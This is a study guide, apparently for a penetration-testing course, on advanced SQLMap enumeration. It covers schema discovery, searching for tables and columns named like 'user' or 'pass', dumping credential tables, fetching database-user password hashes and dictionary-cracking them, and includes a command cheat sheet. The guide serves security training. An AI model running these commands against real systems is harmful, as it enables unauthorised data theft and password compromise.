![Image](https://images.openai.com/static-rsc-4/63ku4rYiJBfPe8Z2Cx0UYNzusX0aEbLwR-75PSEPpyYFC66xN94R61y6YbTc-AnJdd0FvdNV5hvtgbdkA2Z3lTOopx1dxoORsu4Q-_UB3MJdrV7-HZ9BYwJdpy03WRMp7haSeistallwmXV8OVAbwJEykBG0h6JhWSL7m733Up12TWimnbGKQaeeiQtM8oHa?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/TcS5tbrQ9eGr_utvumdVkzIiY0fhoBRmrI5Z0eoFzFpboJ0QO09sJG17t10gnWsdoBCOJ4AQOiSywGRSeUOvwiSHNFVtKG1OHo8GUpJ5rvzJfTKCECpD-DRNkKHDSTwFVXLNnHhTMSn1p610KSkQ8Txm5ADwc_xvsj4M0xVxsaxLDdggjlWBZgHkPhIQSg5I?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/vGR45yDsfHEVAaPDPyq36he0oV3nVCkMentqtGkhcFueL_VkN3FRd3jJM266jk7WWkgd7SHLbVxBKjxFgdgn1TYqSkJeQ4vfzSLtdGFY7gT89UHskEETTgxP_O5weCIrQDfBPCfM8BLA1_-xLiDZJmLIuWHzjQ8kLc-PBXFihTQmulSbXUshircHlSI9Nwc7?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/1wxqMsHRxGKcQuY1pUSRd8M9WUOmdP8pp_BhouQZ4m8OvHFMkRLWwmgoKRJFrDy0dSkZC7MioJMD_KR533rW7PFdke2TW9hIzV1PCdy3xIKB9sN2Ep_nwmvKOuqIzIJ6N54m17BWxE6XDwnFbNYkiOAA7OWRXMfqyi-IeleAZazhR_9Cj2W-vSuOsSScZ9Zk?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/R1ebk8cDC9adoC591m61eVfdo6m62oi78z-NVUa9NGxQLeOulvTTHozHxVHhODPSW511RnXaubUR_oDoPa66nj4E9iJaFAROsibHA-G50N43LYUiBToub-paqaMUTVyq3ZawFLcB-kC_3M00cOvVq5zh7vAKsQn0baTrs3bCwRzyXsJzdJOLQfxnqkU1Y1In?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/ed4vEsj_ULnLeR-CXX818GZwqtmzyxtmcTgVfPPtIU7jpfdVsUkrUVUqBP0JY8DHnwWftIKJsmOhnWcm_2KZHYGOQt028iiQHwYJvYUT-xpdluOX4Fm1bpSdvp0k_xBRNxC_tzOzeDT208zFg4tAGBZS62Axxo4FagkxbB_eazM83CROVCFLVzkjeNgWcJ1L?purpose=fullsize)

---

# 1. Advanced Database Enumeration

After covering basic database enumeration, SQLMap provides additional techniques for finding **specific data of interest** in complex databases.

The general progression is:

```text
SQLi confirmed
      ↓
Basic enumeration
      ↓
Advanced enumeration
      ↓
Database schema
      ↓
Search for interesting tables/columns
      ↓
Retrieve relevant data
      ↓
Identify password hashes
      ↓
Optional dictionary-based cracking
```

---

# 2. DB Schema Enumeration

## What is a database schema?

A database schema gives you the **structure of the database**.

Instead of simply asking:

> "What tables exist?"

you can obtain a broader picture showing:

- Databases
    
- Tables
    
- Columns
    
- Column types
    

SQLMap provides:

```text
--schema
```

for this purpose.

---

## Command

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

---

# 3. What `--schema` Shows

The output can look like:

```text
Database: master
Table: log
[3 columns]

+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+
```

Another example:

```text
Database: owasp10
Table: accounts
[4 columns]

+-------------+---------+
| Column      | Type    |
+-------------+---------+
| cid         | int(11) |
| mysignature | text    |
| password    | text    |
| username    | text    |
+-------------+---------+
```

And:

```text
Database: testdb
Table: users
[3 columns]

+---------+---------------+
| Column  | Type          |
+---------+---------------+
| id      | int(11)       |
| name    | varchar(500)  |
| surname | varchar(1000) |
+---------+---------------+
```

---

# 4. Why `--schema` Is Useful

Imagine a large database:

```text
                    DATABASE
                       │
        ┌──────────────┼──────────────┐
        ▼              ▼              ▼
      users          accounts        logs
        │              │              │
     columns        columns        columns
```

Instead of manually enumerating every table individually, `--schema` provides a **complete structural overview**.

### Remember:

```text
--tables
   ↓
Table names

--schema
   ↓
Database architecture
   ↓
Tables + columns + types
```

---

# 5. Searching for Data

Large databases can contain:

- Many databases
    
- Hundreds of tables
    
- Thousands of columns
    

Manually inspecting everything can become inefficient.

SQLMap therefore provides:

```text
--search
```

which allows searching for **database, table, and column identifiers** using the `LIKE` operator.

---

# 6. Searching Table Names

Suppose you're interested in tables whose names contain:

```text
user
```

The command from the material is:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

SQLMap searches table identifiers matching the keyword.

---

# 7. Understanding `-T` with `--search`

In this context:

```text
--search
```

means:

> Search database identifiers.

And:

```text
-T user
```

means:

> Search for table names matching `user`.

The example finds:

```text
Database: testdb
users

Database: master
users

Database: information_schema
USER_PRIVILEGES

Database: mysql
user
```

---

# 8. Why Search Is Powerful

Imagine:

```text
Database
│
├── logs
├── configuration
├── sessions
├── users
├── user_settings
├── user_profiles
├── products
├── transactions
└── ...
```

Instead of checking every table:

```text
users
user_settings
user_profiles
```

can be discovered using a targeted search.

Conceptually:

```text
--search
   │
   ▼
Identifier matching
   │
   ▼
Interesting targets
```

---

# 9. Searching Column Names

You can also search for columns matching a keyword.

The material uses:

```text
pass
```

as the example.

Command:

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

---

# 10. What `-C pass` Does

Here:

```text
-C
```

specifies a **column-name search**.

So:

```bash
--search -C pass
```

means approximately:

```text
Search column identifiers
        ↓
Matching "pass"
        ↓
Show matching databases/tables/columns
```

---

# 11. Example Search Results

The source finds:

```text
Database: owasp10
Table: accounts
Column: password
```

and:

```text
Database: master
Table: users
Column: password
```

as well as:

```text
Database: mysql
Table: user
Column: Password
```

and:

```text
Database: mysql
Table: servers
Column: Password
```

---

# 12. Search Workflow

This is worth memorizing:

```text
Complex database
       ↓
--search
       ↓
Search table names
       ↓
-T <keyword>
       ↓
OR
       ↓
Search column names
       ↓
-C <keyword>
       ↓
Identify interesting targets
```

---

# 13. Password Enumeration and Cracking

Once a table containing password information is identified, the source demonstrates retrieving that table with:

```text
-T
```

For example:

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

SQLMap first retrieves the table's columns and entries. It can then recognize values that appear to be password hashes.

---

# 14. Automatic Hash Recognition

An important SQLMap feature is automatic recognition of possible password hashes.

The example reports:

```text
recognized possible password hashes
in column 'password'
```

SQLMap then asks whether you want to perform a dictionary-based attack against those hashes.

---

# 15. Dictionary-Based Cracking

The source demonstrates SQLMap asking:

```text
do you want to crack them via a dictionary-based attack? [Y/n/q]
```

It identifies the hash method:

```text
using hash method 'sha1_generic_passwd'
```

Then SQLMap asks which dictionary to use.

Available choices in the example are:

```text
[1] default dictionary
[2] custom dictionary
[3] file with list of dictionary files
```

---

# 16. SQLMap's Default Dictionary

The source shows the default dictionary location as:

```text
/usr/local/share/sqlmap/data/txt/wordlist.tx_
```

The material notes that SQLMap's included dictionary contains approximately:

```text
1.4 million entries
```

---

# 17. Multiprocessing

SQLMap performs hash cracking using multiple processes.

The number of processes is based on the available CPU cores.

The example shows:

```text
starting 8 processes
```

Conceptually:

```text
                 Hash list
                     │
          ┌──────────┼──────────┐
          ▼          ▼          ▼
       Process 1  Process 2  Process 3 ...
          │          │          │
          └──────────┼──────────┘
                     ▼
              Cracked results
```

---

# 18. Supported Hash Algorithms

According to the provided material, SQLMap has support for:

```text
31 different hash algorithms
```

and includes a dictionary containing:

```text
1.4 million entries
```

The material notes that if a password hash isn't randomly chosen, there is a good probability that SQLMap may automatically crack it.

---

# 19. Password Hash vs Password

This distinction is important:

```text
Hash
 ↓
One-way representation
```

while a successful dictionary attack attempts:

```text
Candidate password
       ↓
Hash candidate
       ↓
Compare with stored hash
       ↓
Match?
```

Conceptually:

```text
Stored hash
     │
     │ compare
     ▼
Dictionary candidates
     │
     ▼
Matching candidate
```

---

# 20. DB Users Password Enumeration

There is another category of credentials besides passwords stored in normal application tables.

Database systems themselves can have system tables containing database-user credentials or password hashes.

The source introduces:

```text
--passwords
```

specifically for this purpose.

---

# 21. `--passwords`

Example from the material:

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

The output begins with:

```text
fetching database users password hashes
```

---

# 22. Database Users

The example discovers users such as:

```text
root
root
root
debian-sys-maint
```

SQLMap can then offer dictionary-based cracking for the retrieved hashes.

---

# 23. `--passwords` Workflow

```text
--passwords
      ↓
Retrieve DB-user password hashes
      ↓
Identify hash format
      ↓
Choose dictionary attack
      ↓
Hash candidates
      ↓
Compare
      ↓
Potential password recovery
```

---

# 24. `--batch`

The examples frequently use:

```text
--batch
```

This automatically selects the default answers for SQLMap's interactive questions.

For example:

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

This is particularly useful for automated lab workflows, but remember that automatic defaults may not always be what you want during a careful manual assessment.

---

# 25. `--all`

The material finishes with a very powerful option:

```text
--all
```

When combined with:

```text
--batch
```

SQLMap can automatically perform the **whole enumeration process** on the target.

Conceptually:

```text
--all --batch
       ↓
Everything SQLMap can enumerate
       ↓
Databases
Users
Tables
Columns
Data
Privileges
etc.
```

---

# 26. ⚠️ Why `--all` Can Be a Problem

The source gives an important warning:

> Everything accessible will be retrieved, potentially running for a very long time.

So:

```text
--all
 ↓
Maximum enumeration
 ↓
Huge amount of information
 ↓
Potentially very long execution
```

You may then have to manually inspect the output files to locate the information you're actually interested in.

---

# 27. Targeted vs Complete Enumeration

### Targeted approach

```text
Search
 ↓
Find interesting table
 ↓
Dump only that table
 ↓
Extract relevant columns/data
```

### Complete approach

```text
--all --batch
      ↓
Enumerate everything accessible
      ↓
Large output
      ↓
Manually identify useful information
```

For learning and controlled labs, understanding both approaches is important.

---

# 28. Complete Advanced Enumeration Workflow 🔥

![Image](https://images.openai.com/static-rsc-4/uZ0O0nrakhMrjK83XBs0RJkt8xN5hh8EOEIynrf2zEYApet7a3ObhDWF3sgIQfagnqVRmQGib2xfeH2BAiDEDhk3OMyxpMtax7IoUnzmdDtxYEPjXXVi36XOeGPOWyQpXdkTVOraVTV4aTz212TAoFcPYDU_ixyBpdEReZ7DxCjxfVGy5ZZuOjctLaXI7-Y5?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/dHdAEO4syUs7kSnBkksIoF-PMIjlMnd1gO_OUlNbsb1VjVjVZWHbXzmhvNkg71nYc3sj_LYomQWPVjfrOVzCnHiLnaH0JSUZof3M-XGsjcimpu0lnXmByquucy-hkL_wR6dFCL2wD9YU4wa5xcNks0bh6ZlFlAIg5GO51mWSFckrVanVRvTrMcCmfLkwfZ7T?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/GtixZfrEB5DrI_ZAPGCk0s0dsIvZVBgkw22b7FXl-aWgBvZ1u8GY9ctHzLiBbU0dnFVxQyLC4ZPBOwkBnDDyfgAMO60GnCk4iPxkEfinFp16k3331_BtFgMkfUA2dHVs6E00zkfxCSgU1WTdhjpUwxiuOjwW2QQNnlJ8aBCPyocQQ090_3EBk7XXMyn_9W5w?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/iLsNXZRmP65KYlnZh8_69Gq8xq6koUDIgcFxW57dkY29Np1_X-cuSHzJcNPBHXKiqQaoyRGHjBwjKLS8cju5C3xTzvj91oHcVuEvcCXmZE4OqIiAYGgEGo8CfXxXcVQqCRE8kLlHejYdh_XZTN7JGRDotZ2dpGUfhOCYwI40xgF6RQuIfoPEVkjivYCklcfi?purpose=fullsize)

```text
                  SQLi confirmed
                        │
                        ▼
                 ┌─────────────┐
                 │   --schema  │
                 └──────┬──────┘
                        │
                        ▼
              Understand DB structure
                        │
                        ▼
                Need specific target?
                    /           \
                  YES            NO
                   │              │
                   ▼              ▼
              --search          --all
                   │           --batch
             ┌─────┴─────┐
             ▼           ▼
          -T user      -C pass
             │           │
             ▼           ▼
       Interesting    Password
        tables        columns
             │           │
             └─────┬─────┘
                   ▼
                 --dump
                   │
                   ▼
           Possible password hashes
                   │
                   ▼
        Dictionary-based cracking
                   │
                   ▼
             Relevant results
```

---

# 29. Important Command Cheat Sheet

### Schema

```bash
sqlmap -u "http://TARGET/?id=1" --schema
```

### Search table names

```bash
sqlmap -u "http://TARGET/?id=1" --search -T <keyword>
```

### Search column names

```bash
sqlmap -u "http://TARGET/?id=1" --search -C <keyword>
```

### Dump a specific table

```bash
sqlmap -u "http://TARGET/?id=1" --dump -D <database> -T <table>
```

### Database-user password hashes

```bash
sqlmap -u "http://TARGET/?id=1" --passwords --batch
```

### Full enumeration

```bash
sqlmap -u "http://TARGET/?id=1" --all --batch
```

---

# 30. Option → Purpose

|Option|Purpose|
|---|---|
|`--schema`|Retrieve database/table/column structure|
|`--search`|Search database identifiers|
|`-T`|Work with/search table names|
|`-C`|Work with/search column names|
|`--dump`|Retrieve table data|
|`-D`|Specify database|
|`--passwords`|Enumerate database-user password hashes|
|`--batch`|Automatically choose default answers|
|`--all`|Perform the whole enumeration process|

The commands and functions above are taken from the supplied module.

---

# 🧠 31. What You Should Memorize

### Schema

```text
--schema
```

**Think:**

> "Show me the database architecture."

---

### Search tables

```text
--search -T <keyword>
```

**Think:**

> "Find tables whose names match this keyword."

---

### Search columns

```text
--search -C <keyword>
```

**Think:**

> "Find columns whose names match this keyword."

---

### Dump

```text
--dump -D <database> -T <table>
```

**Think:**

> "Retrieve the contents of this specific table."

---

### Database credentials

```text
--passwords
```

**Think:**

> "Look for database-user password hashes."

---

### Everything

```text
--all --batch
```

**Think:**

> "Automate the entire enumeration process."

But remember the warning:

```text
--all
 ↓
Everything accessible
 ↓
Potentially VERY long-running
 ↓
Large output
```

---

# 🔥 Final Mental Model

```text
                    ADVANCED ENUMERATION
                            │
          ┌─────────────────┼─────────────────┐
          ▼                 ▼                 ▼
       SCHEMA             SEARCH          PASSWORDS
          │                 │                 │
          ▼                 ▼                 ▼
     Architecture      -T / -C          DB credentials
          │                 │                 │
          └─────────────────┼─────────────────┘
                            ▼
                         DUMP
                            │
                            ▼
                    Password hashes
                            │
                            ▼
                 Dictionary-based attack
```

### The golden sequence:

> **Schema → Search → Identify → Dump → Analyze → Hash handling**

That is the core of **Advanced Database Enumeration with SQLMap**.